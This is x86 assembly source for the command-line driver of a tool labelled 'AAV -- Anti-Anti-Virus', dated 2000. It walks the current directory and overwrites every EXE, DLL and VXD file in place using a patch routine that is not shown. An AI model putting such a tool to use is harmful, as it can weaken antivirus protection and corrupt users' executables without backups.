   ; cmdline interface for AAVPATCH.INC

   include                 INCLUDE\consts.inc

   callW                   macro   _xxx
                           extrn   _xxx:proc
                           call    _xxx
                           endm

                           p386
                           model   flat
                           locals  __
                           jumps

                           .data

   allfiles                db      '*.*',0

   bufptr                  dd      ?
   bufsize                 dd      ?

   ff                      ff_struc ?

   argc                    dd      ?
   argv0                   db      256 dup (?)
   argv1                   db      256 dup (?)
   argv2                   db      256 dup (?)
   argv3                   db      256 dup (?)

                           .code
   start:
                           call    dump_msg
                           db      'AAV -- Anti-Anti-Virus -- (x) 2000',13,10,0

                           call    getcmdline
                           cmp     argc, 2
                           jne     help

                           lea     edx, argv1

                           cmp     byte ptr [edx], '*'
                           je      patch_all

                           call    patch_file

   quit:                   push    -1
                           callW   ExitProcess

   help:                   call    dump_msg
                           db      'syntax:',13,10
                           db      '  AAVPATCH filename  -- patch single file',13,10
                           db      '  AAVPATCH *         -- patch all EXE/DLL/VXD files in the current directory',13,10,0
                           jmp     quit

   patch_all:              pusha

                           push    offset ff
                           push    offset allfiles
                           callW   FindFirstFileA
                           xchg    ebx, eax

                           inc     eax
                           je      __quit

   __cycle:                test    ff.ff_attr, 16  ; dir
                           jnz     __next
                           cmp     ff.ff_fullname, '.'
                           je      __next

                           lea     edx, ff.ff_fullname
   __scanext:              mov     al, [edx]
                           inc     edx
                           or      al, al
                           jnz     __scanext
                           mov     eax, [edx-5]
                           or      eax, 20202000h

                           cmp     eax, 'exe.'
                           je      __fuck
                           cmp     eax, 'lld.'
                           je      __fuck
                           cmp     eax, 'dxv.'
                           je      __fuck

                           jmp     __next

   __fuck:                 lea     edx, ff.ff_fullname
                           call    patch_file

   __next:                 push    offset ff
                           push    ebx
                           callW   FindNextFileA

                           or      eax, eax
                           jnz     __cycle

                           push    ebx
                           callW   FindClose

   __quit:                 popa
                           jmp     quit

   ; input: EDX=filename

   patch_file:             pusha

                           call    dump_msg
                           db      'þ ',0
                           call    dump_asciiz_edx

                           mov     edx, [esp].pusha_edx
                           call    fopen_ro
                           jc      error
                           xchg    ebx, eax

                           call    fgetsize
                           mov     bufsize, eax

                           push    eax
                           push    0
                           callW   GlobalAlloc
                           or      eax, eax
                           jz      error
                           mov     bufptr, eax

                           mov     edx, bufptr
                           mov     ecx, bufsize
                           call    fread

                           call    fclose

                           mov     esi, bufptr
                           mov     ecx, bufsize
                           call    patch_buffer
                           or      eax, eax
                           jz      done

                           call    dump_space
                           call    dump_dec

                           mov     edx, [esp].pusha_edx
                           call    fcreate
                           jc      error
                           xchg    ebx, eax

                           mov     edx, bufptr
                           mov     ecx, bufsize
                           call    fwrite

                           call    fclose

   done:                   call    dump_crlf

                           popa
                           retn

   error:                  call    dump_msg
                           db      13,10,'***ERROR***',13,10,0
                           jmp     done

   include                 INCLUDE\fioexlow.inc
   include                 INCLUDE\console.inc
   include                 INCLUDE\cmdline.inc

   include                 aavpatch.inc

                           end     start
